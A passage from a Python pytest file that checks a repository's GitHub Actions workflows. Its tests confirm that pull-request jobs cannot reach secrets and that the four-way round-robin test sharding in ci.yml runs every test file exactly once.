        workflow["env"] = value
    else:
        _jobs(workflow)["publish"]["env"].update(value)

    with pytest.raises(AssertionError):
        _assert_no_pull_request_secret_access("edge-images.yml", workflow)


def test_pull_request_secret_policy_allows_a_secret_behind_a_non_pr_job_gate() -> None:
    workflow = copy.deepcopy(_workflow("edge-images.yml"))
    _jobs(workflow)["deploy"] = {
        "runs-on": "ubuntu-latest",
        "if": "github.event_name != 'pull_request'",
        "env": {"TOKEN": "${{ secrets.DATASET_OPS_TOKEN }}"},
        "steps": [],
    }

    _assert_no_pull_request_secret_access("edge-images.yml", workflow)


def test_pull_request_workflow_discovery_ignores_workflows_without_the_trigger() -> None:
    assert "release.yml" in _tracked_workflows()
    assert "release.yml" not in _pull_request_workflows()
    assert "pull_request" not in _trigger_names(_workflow("release.yml"))


_PYTEST_FILE_PATTERN = re.compile(r"(?:^|/)(?:test_[^/]*|[^/]*_test)\.py$")

_SHARD_EXCLUSIONS = frozenset()

_SHARD_TOTAL = 4


def _tracked_paths() -> tuple[str, ...]:
    return tuple(relative.as_posix() for relative, _ in _index_blobs())


def _collectible_test_files() -> list[str]:
    return sorted(
        path
        for path in _tracked_paths()
        if (ROOT / path).is_file() and _PYTEST_FILE_PATTERN.search(path)
    )


def _round_robin(files: list[str], total: int) -> dict[int, list[str]]:
    return {
        shard: [path for index, path in enumerate(files, start=1) if index % total == shard % total]
        for shard in range(1, total + 1)
    }


def _assert_exact_cover(expected: list[str], partition: dict[int, list[str]], total: int) -> None:
    assert set(partition) == set(range(1, total + 1)), sorted(partition)

    assigned: list[str] = []
    for shard in range(1, total + 1):
        assert partition[shard], f"shard {shard} of {total} is empty"
        assigned.extend(partition[shard])

    duplicates = sorted({path for path in assigned if assigned.count(path) > 1})
    assert not duplicates, duplicates

    missing = sorted(set(expected) - set(assigned))
    assert not missing, missing
    extra = sorted(set(assigned) - set(expected))
    assert not extra, extra


def test_shard_partition_is_an_exact_cover_of_the_suite() -> None:
    collectible = _collectible_test_files()
    assert set(collectible) >= _SHARD_EXCLUSIONS, sorted(_SHARD_EXCLUSIONS - set(collectible))
    expected = [path for path in collectible if path not in _SHARD_EXCLUSIONS]
    assert len(expected) > 250, len(expected)

    _assert_exact_cover(expected, _round_robin(expected, _SHARD_TOTAL), _SHARD_TOTAL)


def test_shard_total_matches_the_matrix_and_the_partition_step() -> None:
    workflow = _workflow("ci.yml")
    test_job = _jobs(workflow)["test"]
    matrix = test_job["strategy"]["matrix"]["shard"]
    assert matrix == [str(shard) for shard in range(1, _SHARD_TOTAL + 1)]
    assert test_job["env"]["SHARD_TOTAL"] == str(_SHARD_TOTAL)


def test_shard_discovery_in_ci_matches_the_partition_modelled_here() -> None:
    step = next(
        step
        for step in _jobs(_workflow("ci.yml"))["test"]["steps"]
        if str(step.get("name", "")).startswith("Run test shard")
    )
    run = str(step["run"])
    assert run.startswith(_SHARD_DISCOVERY)
    assert "grep -E '(^|/)(test_[^/]*|[^/]*_test)\\.py$'" in _SHARD_DISCOVERY
    assert "git ls-files -- '*.py'" in _SHARD_DISCOVERY
    for excluded in _SHARD_EXCLUSIONS:
        assert f"grep -vxF '{excluded}'" in _SHARD_DISCOVERY.replace("\n", "")
    assert _SHARD_DISCOVERY.count("grep -vxF") == len(_SHARD_EXCLUSIONS)
    assert "LC_ALL=C sort" in _SHARD_DISCOVERY
    assert "'NR % total == shard % total'" in _SHARD_DISCOVERY
    assert step["env"]["SHARD"] == "${{ matrix.shard }}"
    assert "${{ matrix.shard }}" not in run


def _ci_shard_discovery_script() -> str:
    step = next(
        step
        for step in _jobs(_workflow("ci.yml"))["test"]["steps"]
        if str(step.get("name", "")).startswith("Run test shard")
    )
    run = str(step["run"])
    end = run.index(")\n") + 2
    script = run[:end]
    assert script.startswith("mapfile -t shard_files < <("), script
    return script


def _run_ci_shard_discovery(shard: int) -> list[str]:
    result = subprocess.run(
        [
            "bash",
            "-c",
            "set -euo pipefail\n"
            + _ci_shard_discovery_script()
            + 'printf "%s\\n" "${shard_files[@]}"\n',
        ],
        cwd=ROOT,
        check=True,
        capture_output=True,
        env=os.environ | {"SHARD": str(shard), "SHARD_TOTAL": str(_SHARD_TOTAL)},
    )
    return [path for path in result.stdout.decode("utf-8").split() if (ROOT / path).is_file()]


def test_ci_shard_discovery_really_selects_the_modelled_partition() -> None:
    expected = _round_robin(
        [path for path in _collectible_test_files() if path not in _SHARD_EXCLUSIONS],
        _SHARD_TOTAL,
    )

    actual = {shard: _run_ci_shard_discovery(shard) for shard in range(1, _SHARD_TOTAL + 1)}

    for shard in range(1, _SHARD_TOTAL + 1):
        assert actual[shard] == expected[shard], shard

    _assert_exact_cover(
        [path for paths in expected.values() for path in paths], actual, _SHARD_TOTAL
    )


def test_cover_check_catches_the_pathspec_that_dropped_files() -> None:
    tree = ["tests/test_a.py", "tests/test_b.py", "tests/foo_test.py", "tests/unit/test_x.py"]
    assert all(_PYTEST_FILE_PATTERN.search(path) for path in tree)
    old_pathspec = ["tests/test_a.py", "tests/test_b.py"]

    with pytest.raises(AssertionError):
        _assert_exact_cover(tree, _round_robin(old_pathspec, 2), 2)


def test_cover_check_catches_an_overlapping_partition() -> None:
    tree = ["tests/test_a.py", "tests/test_b.py"]
    partition = {1: ["tests/test_a.py"], 2: ["tests/test_a.py", "tests/test_b.py"]}

    with pytest.raises(AssertionError):
        _assert_exact_cover(tree, partition, 2)


def test_cover_check_catches_an_empty_shard() -> None:
    tree = ["tests/test_a.py"]

    with pytest.raises(AssertionError):
        _assert_exact_cover(tree, _round_robin(tree, 2), 2)


def test_cover_check_catches_a_file_no_shard_would_run() -> None:
    tree = ["tests/test_a.py", "tests/test_b.py", "tests/test_c.py"]
    partition = _round_robin(tree, 2)
    partition[1] = []
    partition[2] = tree

    with pytest.raises(AssertionError):
        _assert_exact_cover(tree, partition, 2)


def test_round_robin_matches_the_awk_indexing() -> None:
    files = [f"tests/test_{index}.py" for index in range(1, 9)]
    partition = _round_robin(files, 4)

    assert partition[1] == ["tests/test_1.py", "tests/test_5.py"]
    assert partition[2] == ["tests/test_2.py", "tests/test_6.py"]
    assert partition[3] == ["tests/test_3.py", "tests/test_7.py"]
    assert partition[4] == ["tests/test_4.py", "tests/test_8.py"]
